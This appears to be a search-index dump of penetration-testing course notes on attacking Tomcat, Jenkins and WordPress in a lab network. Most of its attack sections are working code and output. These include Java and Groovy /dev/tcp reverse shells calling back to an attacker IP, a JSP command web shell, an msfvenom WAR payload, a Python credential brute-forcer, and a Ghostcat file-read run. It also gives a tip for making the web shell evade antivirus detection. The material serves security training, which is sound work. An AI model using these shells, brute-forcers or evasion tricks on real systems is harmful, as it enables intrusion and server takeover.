change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1 . We could run commands on a Windows-based Jenkins install using this snippet: def cmd = \"cmd.exe /c dir\".execute(); println(\"${cmd.text}\"); We could also use this Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port. String host = \"localhost\" ; int port = 8044 ; String cmd = \"cmd.exe\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while (! s . isClosed ()){ while ( pi . available ()> 0 ) so . write ( pi . read ()); while ( pe . available ()> 0 ) so . write ( pe . read ()); while ( si . available ()> 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close ();","title":"Servlet Containers/Software Development"},{"location":"attacking_common_apps/containers_software_dev/#tomcat-discovery-enumeration","text":"Apache Tomcat is an open-source web server that hosts applications written in Java.","title":"Tomcat Discovery &amp; Enumeration"},{"location":"attacking_common_apps/containers_software_dev/#discoveryfootprint","text":"Tomcat servers can be identified by the Server header in the HTTP response. hrmns@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat <html lang=\"en\"><head><META http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><link href=\"./images/docs-stylesheet.css\" rel=\"stylesheet\" type=\"text/css\"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name=\"author\" <SNIP> This is the default documentation page, which may not be removed by administrators. General folder structure of a Tomcat installation. \u251c\u2500\u2500 bin \u251c\u2500\u2500 conf \u2502 \u251c\u2500\u2500 catalina.policy \u2502 \u251c\u2500\u2500 catalina.properties \u2502 \u251c\u2500\u2500 context.xml \u2502 \u251c\u2500\u2500 tomcat-users.xml \u2502 \u251c\u2500\u2500 tomcat-users.xsd \u2502 \u2514\u2500\u2500 web.xml \u251c\u2500\u2500 lib \u251c\u2500\u2500 logs \u251c\u2500\u2500 temp \u251c\u2500\u2500 webapps \u2502 \u251c\u2500\u2500 manager \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u251c\u2500\u2500 META-INF \u2502 \u2502 \u2514\u2500\u2500 WEB-INF | | \u2514\u2500\u2500 web.xml \u2502 \u2514\u2500\u2500 ROOT \u2502 \u2514\u2500\u2500 WEB-INF \u2514\u2500\u2500 work \u2514\u2500\u2500 Catalina \u2514\u2500\u2500 localhost The bin folder stores scripts and binaries needed to start and run a Tomcat server. The conf folder stores various configuration files used by Tomcat. The tomcat-users.xml file stores user credentials and their assigned roles. The lib folder holds the various JAR files needed for the correct functioning of Tomcat. The logs and temp folders store temporary log files. The webapps folder is the default webroot of Tomcat and hosts all the applications. The work folder acts as a cache and is used to store data during runtime. Each folder inside webapps is expected to have the following structure. webapps/customapp \u251c\u2500\u2500 images \u251c\u2500\u2500 index.jsp \u251c\u2500\u2500 META-INF \u2502 \u2514\u2500\u2500 context.xml \u251c\u2500\u2500 status.xsd \u2514\u2500\u2500 WEB-INF \u251c\u2500\u2500 jsp | \u2514\u2500\u2500 admin.jsp \u2514\u2500\u2500 web.xml \u2514\u2500\u2500 lib | \u2514\u2500\u2500 jdbc_drivers.jar \u2514\u2500\u2500 classes \u2514\u2500\u2500 AdminServlet.class The most important file among these is WEB-INF/web.xml , which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. example web.xml file. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\"> <web-app> <servlet> <servlet-name>AdminServlet</servlet-name> <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class> </servlet> <servlet-mapping> <servlet-name>AdminServlet</servlet-name> <url-pattern>/admin</url-pattern> </servlet-mapping> </web-app> web.xml configuration above defines a new servlet named AdminServlet that is mapped to the class com.inlanefreight.api.AdminServlet . Next, a new servlet mapping is created to map requests to /admin with AdminServlet . This configuration will send any request received for /admin to the AdminServlet.class class for processing. The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability. The tomcat-users.xml file is used to allow or disallow access to the** /manager** and host-manager admin pages. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <SNIP> <tomcat-users xmlns=\"http://tomcat.apache.org/xml\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\" version=\"1.0\"> <!-- By default, no user is included in the \"manager-gui\" role required to operate the \"/manager/html\" web application. If you wish to use this app, you must define such a user - the username and password are arbitrary. Built-in Tomcat manager roles: - manager-gui - allows access to the HTML GUI and the status pages - manager-script - allows access to the HTTP API and the status pages - manager-jmx - allows access to the JMX proxy and the status pages - manager-status - allows access to the status pages only The users below are wrapped in a comment and are therefore ignored. If you wish to configure one or more of these users for use with the manager web application, do not forget to remove the <!.. ..> that surrounds them. You will also need to set the passwords to something appropriate. --> <SNIP> !-- user manager can access only manager section --> <role rolename=\"manager-gui\" /> <user username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui\" /> <!-- user admin can access manager and admin section both --> <role rolename=\"admin-gui\" /> <user username=\"admin\" password=\"admin\" roles=\"manager-gui,admin-gui\" /> </tomcat-users> We can see that a user tomcat with the password tomcat has the manager-gui role, and a second weak password admin is set for the user account admin","title":"Discovery/Footprint"},{"location":"attacking_common_apps/containers_software_dev/#enumeration","text":"After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the /manager and the /host-manager pages. hrmns@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://web01.inlanefreight.local:8180/ [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/09/21 17:34:54 Starting gobuster =============================================================== /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) Progress: 49959 / 87665 (56.99%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/09/21 17:44:29 Finished =============================================================== We may be able to either log in to one of these using weak credentials such as tomcat:tomcat , admin:admin , etc. If these first few tries don't work, we can try a password brute force attack against the login page. If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR) file containing a JSP web shell","title":"Enumeration"},{"location":"attacking_common_apps/containers_software_dev/#attacking-tomcat","text":"If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server.","title":"Attacking Tomcat"},{"location":"attacking_common_apps/containers_software_dev/#tomcat-manager-login-brute-force","text":"msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58 msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options Module options (auxiliary/scanner/http/tomcat_mgr_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no The HTTP password to specify for authentication PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.201.58 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 8180 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections STOP_ON_SUCCESS true yes Stop guessing when a credential works for a host TARGETURI /manager/html yes URI for Manager login. Default is /manager/html THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no The HTTP username to specify for authentication USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt no File containing users, one per line VERBOSE true yes Whether to print output for all attempts VHOST web01.inlanefreight.local no HTTP server virtual host msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [!] No active DB -- Credential data will not be saved! [-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect) [+] 10.129.201.58:8180 - Login Successful: tomcat:admin [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed It is important to note that there are many tools available to us as penetration testers. Many exist to make our work more efficient, especially since most penetration tests are \"time-boxed\" or under strict time constraints. No one tool is better than another, and it does not make us a \"bad\" penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. Some say, \"work smarter, not harder.\" Why would we make extra work for ourselves during a 40-hour assessment with 1,500 in-scope hosts when we can use a particular tool to help us? It is vital for us to understand how our tools work and how to do many things manually. At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment. Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following: msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080 PROXIES => HTTP:127.0.0.1:8080 msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [!] No active DB -- Credential data will not be saved! [-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect) We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses. A quick check of the value in the Authorization header for one request shows that the scanner is running correctly, base64 encoding the credentials admin:vagrant the way the Tomcat application would do when a user attempts to log in directly from the web application. hrmns@htb[/htb]$ echo YWRtaW46dmFncmFudA == | base64 -d admin:vagrant can also use this Python script to achieve the same result. #!/usr/bin/python import requests from termcolor import cprint import argparse parser = argparse . ArgumentParser ( description = \"Tomcat manager or host-manager credential bruteforcing\" ) parser . add_argument ( \"-U\" , \"--url\" , type = str , required = True , help = \"URL to tomcat page\" ) parser . add_argument ( \"-P\" , \"--path\" , type = str , required = True , help = \"manager or host-manager URI\" ) parser . add_argument ( \"-u\" , \"--usernames\" , type = str , required = True , help = \"Users File\" ) parser . add_argument ( \"-p\" , \"--passwords\" , type = str , required = True , help = \"Passwords Files\" ) args = parser . parse_args () url = args . url uri = args . path users_file = args . usernames passwords_file = args . passwords new_url = url + uri f_users = open ( users_file , \"rb\" ) f_pass = open ( passwords_file , \"rb\" ) usernames = [ x . strip () for x in f_users ] passwords = [ x . strip () for x in f_pass ] cprint ( \" \\n [+] Atacking.....\" , \"red\" , attrs = [ 'bold' ]) for u in usernames : for p in passwords : r = requests . get ( new_url , auth = ( u , p )) if r . status_code == 200 : cprint ( \" \\n [+] Success!!\" , \"green\" , attrs = [ 'bold' ]) cprint ( \"[+] Username : {} \\n [+] Password : {} \" . format ( u , p ), \"green\" , attrs = [ 'bold' ]) break if r . status_code == 200 : break if r . status_code != 200 : cprint ( \" \\n [+] Failed!!\" , \"red\" , attrs = [ 'bold' ]) cprint ( \"[+] Could not Find the creds :( \" , \"red\" , attrs = [ 'bold' ]) #print r.status_code We can try out the script with the default Tomcat users and passwords file that the above Metasploit module uses. hrmns@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt [+] Atacking..... [+] Success!! [+] Username : b'tomcat' [+] Password : b'admin'","title":"Tomcat Manager - Login Brute Force"},{"location":"attacking_common_apps/containers_software_dev/#tomcat-manager-war-file-upload","text":"Many Tomcat installations provide a GUI interface to manage the application. This interface is available at /manager/html by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage. The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this can be downloaded and placed within the archive. <% @ page import = \"java.util.*,java.io.*\" %> <% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %> < HTML >< BODY > < FORM METHOD = \"GET\" NAME = \"myform\" ACTION = \"\" > < INPUT TYPE = \"text\" NAME = \"cmd\" > < INPUT TYPE = \"submit\" VALUE = \"Send\" > </ FORM > < pre > <% if ( request . getParameter ( \"cmd\" ) != null ) { out . println ( \"Command: \" + request . getParameter ( \"cmd\" ) + \"<BR>\" ); Process p = Runtime . getRuntime (). exec ( request . getParameter ( \"cmd\" )); OutputStream os = p . getOutputStream (); InputStream in = p . getInputStream (); DataInputStream dis = new DataInputStream ( in ); String disr = dis . readLine (); while ( disr != null ) { out . println ( disr ); disr = dis . readLine (); } } %> </ pre > </ BODY ></ HTML > hrmns@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp hrmns@htb[/htb]$ zip -r backup.war cmd.jsp adding: cmd.jsp (deflated 81%) Click on Browse to select the .war file and then click on Deploy . This file is uploaded to the manager GUI, after which the /backup application will be added to the table. If we click on backup , we will get redirected to http://web01.inlanefreight.local:8180/backup/ and get a 404 Not Found error. We need to specify the cmd.jsp file in the URL as well. Browsing to http://web01.inlanefreight.local:8180/backup/cmd.jsp will present us with a web shell that we can use to run commands on the Tomcat server hrmns@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd = id <HTML><BODY> <FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"> <INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> Command: id<BR> uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) </pre> </BODY></HTML> To clean up after ourselves, we can go back to the main Tomcat Manager page and click the Undeploy button next to the backups application after, of course, noting down the file and upload location for our report, which in our example is /opt/tomcat/apache-tomcat-10.0.10/webapps . If we do an ls on that directory from our web shell, we'll see the uploaded backup.war file and the backup directory containing the cmd.jsp script and META-INF created after the application deploys. Clicking on Undeploy will typically remove the uploaded WAR archive and the directory associated with the application. Could also use msfvenom to generate a malicious WAR file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it. hrmns@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST = 10 .10.14.15 LPORT = 4443 -f war > backup.war Payload size: 1098 bytes Final size of war file: 1098 bytes Start a Netcat listener and click on /backup to execute the shell. hrmns@htb[/htb]$ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) The multi/http/tomcat_mgr_upload Metasploit module can be used to automate this process. This JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded cmd.jsp would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit). The web shell as is only gets detected by 2/58 anti-virus vendors. A simple change such as changing: FileOutputStream ( f ); stream . write ( m ); o = \"Uploaded: to FileOutputStream ( f ); stream . write ( m ); o = \"uPlOaDeD: results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing. Quick Note on Web shells When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.","title":"Tomcat Manager - WAR File Upload"},{"location":"attacking_common_apps/containers_software_dev/#cve-2020-1938-ghostcat","text":"Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named Ghostcat . All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers. AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan. hrmns@htb[/htb]$ nmap -sV -p 8009 ,8080 app-dev.inlanefreight.local Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT Nmap scan report for app-dev.inlanefreight.local (10.129.201.58) Host is up (0.14s latency). PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 9.0.30 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds The PoC code for the vulnerability can be found here . The exploit can only read files and folders within the web apps folder, which means that files like /etc/passwd can\u2019t be accessed. Let\u2019s attempt to access the web.xml. hrmns@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf ---------------------------- <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. --> <web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\" metadata-complete=\"true\"> <display-name>Welcome to Tomcat</display-name> <description> Welcome to Tomcat </description> </web-app> In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.","title":"CVE-2020-1938 : Ghostcat"},{"location":"attacking_common_apps/containers_software_dev/#jenkins","text":"Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat.","title":"Jenkins"},{"location":"attacking_common_apps/containers_software_dev/#discoveryfootprinting","text":"It is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment. Jenkins runs on Tomcat port 8080 by default. Utilizes port 5000 to attach slave servers. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.","title":"Discovery/Footprinting"},{"location":"attacking_common_apps/containers_software_dev/#enumeration_1","text":"Default installation typically uses Jenkins\u2019 database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page. May encounter a Jenkins instance that uses weak or default credentials such as admin:admin or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test.","title":"Enumeration"},{"location":"attacking_common_apps/containers_software_dev/#attacking-jenkins","text":"Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console . Allows to run arbitrary Groovy scripts within the Jenkins controller runtime. Can be abused to run operating system commands on the underlying server.","title":"Attacking Jenkins"},{"location":"attacking_common_apps/containers_software_dev/#script-console","text":"Script console can be reached at the URL http://jenkins.inlanefreight.local:8000/script def cmd = 'id' def sout = new StringBuffer (), serr = new StringBuffer () def proc = cmd . execute () proc . consumeProcessOutput ( sout , serr ) proc . waitForOrKill ( 1000 ) println sout There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or this Metasploit module. r = Runtime . getRuntime () p = r . exec ([ \"/bin/bash\" , \"-c\" , \"exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \\$line 2>&5 >&5; done\" ] as String []) p . waitFor () Running above cmds results in a revshell hrmns@htb[/htb]$ nc -lvnp 8443 listening on [any] 8443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844 id uid=0(root) gid=0(root) groups=0(root) /bin/bash -i root@app02:/var/lib/jenkins3# Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1 . We could run commands on a Windows-based Jenkins install using this snippet: def cmd = \"cmd.exe /c dir\".execute(); println(\"${cmd.text}\"); We could also use this Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port. String host = \"localhost\" ; int port = 8044 ; String cmd = \"cmd.exe\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while (! s . isClosed ()){ while ( pi . available ()> 0 ) so . write ( pi . read ()); while ( pe . available ()> 0 ) so . write ( pe . read ()); while ( si . available ()> 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close ();","title":"Script Console"},{"location":"attacking_common_apps/content_management_systems/","text":"WordPress \u00b6 Discovery/Footprinting \u00b6 A quick way to identify a WordPress site is by browsing to the **/robots.txt**file. A typical robots.txt on a WordPress installation may look like: User-agent: * Disallow: /wp-admin/ Allow: /wp-admin/admin-ajax.php Disallow: /wp-content/uploads/wpforms/ Sitemap: https://inlanefreight.local/wp-sitemap.xml Here the presence of the /wp-admin and /wp-content directories would be a dead giveaway that we are dealing with WordPress. Typically attempting to browse to the wp-admin directory will redirect us to the wp-login.php page. WordPress stores its plugins in the wp-content/plugins directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the wp-content/themes directory. These files should be carefully enumerated as they may lead to RCE. Enumeration \u00b6 Viewing the page with cURL and grepping for WordPress can help us confirm that WordPress is in use and footprint the version number, which we should note down for later. hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress <meta name=\"generator\" content=\"WordPress 5.8\" / Browsing the site and perusing the page source will give us hints to the theme in use, plugins installed, and even usernames if author names are published with posts. hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes <link rel='stylesheet' id='bootstrap-css' href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' /> Take a look at which plugins we can uncover. hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins <link rel='stylesheet' id='contact-form-7-css' href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' /> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script> <link rel='stylesheet' id='mm_frontend-css' href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' /> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script> From the output above, we know that the Contact Form 7 and mail-masta plugins are installed. The next step would be enumerating the versions. Browsing to http://blog.inlanefreight.local/wp-content/plugins/mail-masta/ shows us that directory listing is enabled and that a readme.txt file is present. Checking the page source of another page, we can see that the wpDiscuz plugin is installed, and it appears to be version 7.0.4 hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p = 1 | grep plugins <link rel='stylesheet' id='contact-form-7-css' href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' /> <link rel='stylesheet' id='wpdiscuz-frontend-css-css' href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' /> A quick search for this plugin version shows this unauthenticated remote code execution vulnerability from June of 2021. We'll note this down and move on. It is important at this stage to not jump ahead of ourselves and start exploiting the first possible flaw we see, as there are many other potential vulnerabilities and misconfigurations possible in WordPress that we don't want to miss. Enumerating Users \u00b6 The default WordPress login page can be found at /wp-login.php . A valid username and an invalid password results in the following message: An ivalid username returns that the user was not found: This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames. WPScan \u00b6 WPScan is also able to pull in vulnerability information from external sources. hrmns@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP> <SNIP> [+] URL: http://blog.inlanefreight.local/ [10.129.42.195] [+] Started: Thu Sep 16 23:11:43 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] WordPress readme found: http://blog.inlanefreight.local/readme.html | Found By: Direct Access 